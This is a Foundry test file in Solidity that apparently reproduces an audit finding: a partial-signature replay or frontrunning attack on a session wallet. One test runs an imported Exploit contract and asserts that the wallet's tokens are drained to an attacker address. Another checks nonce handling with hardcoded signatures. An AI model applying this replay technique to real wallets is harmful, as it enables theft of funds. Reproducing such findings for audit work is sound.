// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./63761-h-02-partial-signature-replayfrontrunning-attack-on-session.sol";

contract PartialSessionReplayTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.token().balanceOf(e.ATTACKER()), e.STEAL_AMOUNT(), "stolen");
        assertEq(e.token().balanceOf(address(e.wallet())), 0, "drained");
        assertEq(e.wallet().nonce(), 1, "nonce used by partial");
    }

    function test_multiCallRevertsLeavesNonce() public {
        MockToken token = new MockToken();
        Reverter reverter = new Reverter();
        address signer = 0xe05fcC23807536bEe418f142D19fa0d21BB0cfF7;
        SessionWallet wallet = new SessionWallet(signer, token);
        token.mint(address(wallet), 100 ether);

        Exploit e = new Exploit(); // for constants/sigs only — rebuild manually
        // Use same sigs as Exploit constants
        bytes memory dataA = abi.encodeWithSelector(MockToken.transfer.selector, address(0xA77AC), 100 ether);
        bytes memory dataB = abi.encodeWithSelector(Reverter.alwaysRevert.selector);
        SessionWallet.Call[] memory calls2 = new SessionWallet.Call[](2);
        calls2[0] = SessionWallet.Call(address(token), 0, dataA, 0);
        calls2[1] = SessionWallet.Call(address(reverter), 0, dataB, 0);
        bytes[] memory sigs2 = new bytes[](2);
        sigs2[0] = abi.encodePacked(
            bytes32(0xab1808e0632d8cde8a21d6833f92c2c2a118d7eae1ddac929d7fec1a4dc33e8f),
            bytes32(0x6d8b4e72752bed63ea32e1992e066c7466831093e6dfb80b06299356ee54a9aa),
            uint8(28)
        );
        sigs2[1] = abi.encodePacked(
            bytes32(0x49239d2efcfbc6024a7b5f58e876f047aa0efcb794e710780cfc990f1c85da40),
            bytes32(0x39144e4a9b641c454bd6533524cebf4c26e43fb22a8f82dd1e97bd4816991ff7),
            uint8(27)
        );
        vm.expectRevert();
        wallet.execute(calls2, sigs2);
        assertEq(wallet.nonce(), 0, "nonce unconsumed");
        assertEq(token.balanceOf(address(0xA77AC)), 0, "no transfer");
        e; // silence
    }
}
